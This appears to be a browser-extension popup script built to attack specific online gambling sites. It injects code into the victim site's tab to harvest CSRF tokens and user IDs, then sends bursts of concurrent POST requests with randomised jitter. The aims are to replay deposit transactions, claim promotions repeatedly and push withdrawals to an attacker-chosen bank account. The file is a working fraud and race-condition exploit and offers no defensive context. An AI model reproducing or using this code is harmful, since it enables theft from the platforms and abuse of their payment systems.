/**
 * 🔱 GHOST-SOVEREIGNTY Popup Controller (popup.js)
 * Manages UI interactions, session audits, and strike execution.
 */

document.addEventListener('DOMContentLoaded', async () => {
  // Tab Switching
  const navButtons = document.querySelectorAll('.nav-btn');
  const sections = document.querySelectorAll('.content-section');

  navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.getAttribute('data-tab');
      
      navButtons.forEach(b => b.classList.remove('active'));
      sections.forEach(s => s.classList.remove('active'));

      btn.classList.add('active');
      document.getElementById(`tab-${tabId}`).classList.add('active');
    });
  });

  // Dynamic Inputs Selection
  const strikeSelect = document.getElementById('strike-type');
  const dynamicInputs = document.querySelectorAll('.dynamic-inputs');

  strikeSelect.addEventListener('change', () => {
    const val = strikeSelect.value;
    dynamicInputs.forEach(div => div.classList.add('hidden'));
    document.getElementById(`inputs-${val}`).classList.remove('hidden');
  });

  // Toggle handlers (persist to storage)
  const toggles = [
    'stealth-masking-toggle',
    'modal-shredder-toggle',
    'auto-refresh-toggle'
  ];

  toggles.forEach(id => {
    const el = document.getElementById(id);
    // Load persisted state
    chrome.storage.local.get([id], (res) => {
      if (res[id] !== undefined) {
        el.checked = res[id];
      }
    });

    el.addEventListener('change', () => {
      chrome.storage.local.set({ [id]: el.checked }, () => {
        log(`Stealth option ${id.replace('-toggle', '')} updated to: ${el.checked ? 'ENABLED' : 'DISABLED'}`, 'system');
      });
    });
  });

  // Clear Logs
  document.getElementById('btn-clear-logs').addEventListener('click', () => {
    const feed = document.getElementById('log-feed');
    feed.innerHTML = '<div class="log-entry system">[SYSTEM] Console logs cleared.</div>';
  });

  // Log function
  function log(text, type = 'info') {
    const feed = document.getElementById('log-feed');
    const entry = document.createElement('div');
    const time = new Date().toLocaleTimeString();
    entry.className = `log-entry ${type}`;
    entry.innerText = `[${time}] ${text}`;
    feed.appendChild(entry);
    feed.scrollTop = feed.scrollHeight;
  }

  // Update active tab session details
  async function auditSession() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const url = new URL(tab.url);
      document.getElementById('session-host').innerText = url.hostname;

      if (!url.hostname.includes('jeetexch') && !url.hostname.includes('royaljeet') && !url.hostname.includes('spinjeet')) {
        document.getElementById('session-csrf').innerText = 'Out of Scope';
        document.getElementById('session-csrf').className = 'value badge red';
        return;
      }

      // Execute script inside the active tab to harvest details
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const csrf = document.querySelector('meta[name="csrf-token"]')?.content 
                    || document.querySelector('input[name="_token"]')?.value 
                    || '';
          
          let userId = 'UNKNOWN';
          if (window.user && window.user.id) userId = window.user.id;
          else if (window.userId) userId = window.userId;
          else {
            const match = document.body.innerHTML.match(/"id":(\d{5,9})/);
            if (match) userId = match[1];
          }

          const hasCookie = document.cookie.includes('session') || document.cookie.includes('xsrf') || document.cookie.length > 20;

          return { csrf, userId, hasCookie };
        }
      });

      if (results && results[0] && results[0].result) {
        const { csrf, userId, hasCookie } = results[0].result;
        
        const csrfEl = document.getElementById('session-csrf');
        if (csrf) {
          csrfEl.innerText = csrf.substring(0, 15) + '...';
          csrfEl.className = 'value badge green';
        } else {
          csrfEl.innerText = 'Not Detected';
          csrfEl.className = 'value badge red';
        }

        document.getElementById('session-userid').innerText = userId;

        const cookieEl = document.getElementById('session-cookie');
        if (hasCookie) {
          cookieEl.innerText = 'Synchronized';
          cookieEl.className = 'value badge green';
        } else {
          cookieEl.innerText = 'Not Found';
          cookieEl.className = 'value badge red';
        }
      }
    } catch (e) {
      console.error(e);
    }
  }

  // Auto-run session audit
  await auditSession();
  setInterval(auditSession, 5000);

  // Auto-Detect Deposit DNA Hash Clicker
  document.getElementById('btn-detect-hash').addEventListener('click', async () => {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          // Look for potential deposit hashes in local storage or global window packets
          try {
            return localStorage.getItem('deposit_hash') 
                || sessionStorage.getItem('deposit_hash') 
                || window.depositHash 
                || '';
          } catch (e) {
            return '';
          }
        }
      });

      const detected = results?.[0]?.result;
      if (detected) {
        document.getElementById('quantum-hash').value = detected;
        log(`🧬 Deposit DNA hash auto-detected and loaded: ${detected.substring(0, 16)}...`, 'success');
      } else {
        log(`⚠️ No active deposit DNA hash found in window session. Enter manually.`, 'warn');
      }
    } catch (e) {
      log(`❌ Failed to query tab session: ${e.message}`, 'error');
    }
  });

  // Engage Strike Action
  document.getElementById('btn-fire-strike').addEventListener('click', async () => {
    const vector = strikeSelect.value;
    log(`🚀 Initiating strike sequence: ${vector.toUpperCase()} VECTOR`, 'strike');

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) {
        log('❌ Error: No active tab found.', 'error');
        return;
      }

      // Read form values
      let strikeParams = {};

      if (vector === 'quantum') {
        strikeParams = {
          vector,
          amount: document.getElementById('quantum-amount').value,
          intensity: document.getElementById('quantum-intensity').value,
          hash: document.getElementById('quantum-hash').value
        };
        if (!strikeParams.hash) {
          log('❌ Error: Deposit DNA hash is required for Quantum Strike.', 'error');
          return;
        }
      } else if (vector === 'promo') {
        strikeParams = {
          vector,
          targetId: document.getElementById('promo-target').value,
          intensity: document.getElementById('promo-intensity').value,
          body: document.getElementById('promo-body').value
        };
      } else if (vector === 'withdraw') {
        strikeParams = {
          vector,
          amount: document.getElementById('withdraw-amount').value,
          bankName: document.getElementById('withdraw-bank-name').value,
          acName: document.getElementById('withdraw-ac-name').value,
          acNumber: document.getElementById('withdraw-ac-number').value,
          ifsc: document.getElementById('withdraw-ifsc').value
        };
        if (!strikeParams.acNumber || !strikeParams.ifsc) {
          log('❌ Error: Bank account and IFSC are required.', 'error');
          return;
        }
      } else {
        strikeParams = { vector };
      }

      log(`📡 Syncing active session payload. Injecting strike payload to MAIN world...`, 'info');

      // Inject and execute the strike directly inside the target tab context
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        args: [strikeParams],
        func: async (params) => {
          const token = document.querySelector('meta[name="csrf-token"]')?.content 
                     || document.querySelector('input[name="_token"]')?.value 
                     || '';
          
          let userId = 'UNKNOWN';
          if (window.user && window.user.id) userId = window.user.id;
          else if (window.userId) userId = window.userId;
          else {
            const match = document.body.innerHTML.match(/"id":(\d{5,9})/);
            if (match) userId = match[1];
          }

          const prefix = window.location.hostname.includes('spinjeet.com') ? '/api2/v2' : '';

          try {
            // Quantum Strike
            if (params.vector === 'quantum') {
              const requests = [];
              for (let i = 0; i < params.intensity; i++) {
                // Human-like jitter
                await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
                const orderId = `INV_R${Date.now()}${Math.floor(Math.random() * 999999)}`;
                const body = `_token=${token}&hashed=${params.hash}&amount=${params.amount}&userid=${userId}&orderId=${orderId}`;
                
                requests.push(
                  fetch(`${prefix}/storeTransaction`, {
                    method: 'POST',
                    headers: {
                      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'X-Requested-With': 'XMLHttpRequest',
                      'X-CSRF-TOKEN': token
                    },
                    body: body
                  }).then(async res => {
                    const text = await res.text();
                    return { status: res.status, body: text.substring(0, 100) };
                  }).catch(err => ({ status: 'ERR', body: err.message }))
                );
              }
              const responses = await Promise.all(requests);
              const matrix = {};
              responses.forEach(r => { matrix[r.status] = (matrix[r.status] || 0) + 1; });
              return { success: true, matrix };
            }

            // Promotion Strike
            if (params.vector === 'promo') {
              const requests = [];
              const targetUrl = `${prefix}/joinPromotion/${params.targetId}`;
              const finalBody = `_token=${token}&${params.body}`;

              for (let i = 0; i < params.intensity; i++) {
                await new Promise(r => setTimeout(r, 50 + Math.random() * 150));
                requests.push(
                  fetch(targetUrl, {
                    method: 'POST',
                    headers: {
                      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'X-Requested-With': 'XMLHttpRequest',
                      'X-CSRF-TOKEN': token
                    },
                    body: finalBody
                  }).then(async res => {
                    const text = await res.text();
                    return { status: res.status, body: text.substring(0, 100) };
                  }).catch(err => ({ status: 'ERR', body: err.message }))
                );
              }
              const responses = await Promise.all(requests);
              const matrix = {};
              responses.forEach(r => { matrix[r.status] = (matrix[r.status] || 0) + 1; });
              return { success: true, matrix };
            }

            // Lightning Withdrawal
            if (params.vector === 'withdraw') {
              const withdrawUrl = `${prefix}/api2/v2/withdraw`; // Check correct endpoint
              const body = `_token=${token}&amount=${params.amount}&account_name=${encodeURIComponent(params.acName)}&account_number=${params.acNumber}&ifsc=${params.ifsc}&bank_name=${encodeURIComponent(params.bankName)}`;
              
              const res = await fetch(withdrawUrl, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: body
              });
              
              const text = await res.text();
              let json = null;
              try { json = JSON.parse(text); } catch (e) {}
              
              return {
                success: res.status === 200,
                status: res.status,
                json,
                raw: text.substring(0, 200)
              };
            }

            // Verification Audit Probe
            if (params.vector === 'probe') {
              const res = await fetch(`${prefix}/joinPromotion/1`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: `_token=${token}&amount=1000`
              });
              const text = await res.text();
              return { status: res.status, body: text.substring(0, 200) };
            }

          } catch (e) {
            return { success: false, error: e.message };
          }
        }
      });

      if (results && results[0] && results[0].result) {
        const res = results[0].result;
        
        if (res.success) {
          if (res.matrix) {
            log(`✅ Strike Complete. Response Matrix: ${JSON.stringify(res.matrix)}`, 'success');
          } else if (res.status !== undefined) {
            log(`✅ Withdrawal Request sent. HTTP ${res.status}. Response: ${res.raw}`, 'success');
          } else {
            log(`✅ Probe Response: ${JSON.stringify(res)}`, 'success');
          }
        } else {
          log(`❌ Strike Failed or returned unexpected data: ${res.error || JSON.stringify(res)}`, 'error');
        }
      } else {
        log(`❌ Strike Execution script returned empty response.`, 'error');
      }

    } catch (e) {
      log(`❌ Critical execution error: ${e.message}`, 'error');
    }
  });
});
